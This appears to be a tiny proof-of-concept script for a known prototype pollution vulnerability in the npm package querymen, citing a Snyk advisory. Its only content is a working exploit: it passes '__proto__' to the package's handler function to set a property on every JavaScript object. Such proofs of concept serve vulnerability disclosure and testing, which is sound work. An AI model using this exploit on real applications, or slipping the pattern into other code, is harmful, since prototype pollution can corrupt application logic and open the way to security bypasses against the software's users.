//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867
    var a = require("querymen");
    obj = {}
    
    a.handler("__proto__","polluted","yes");
  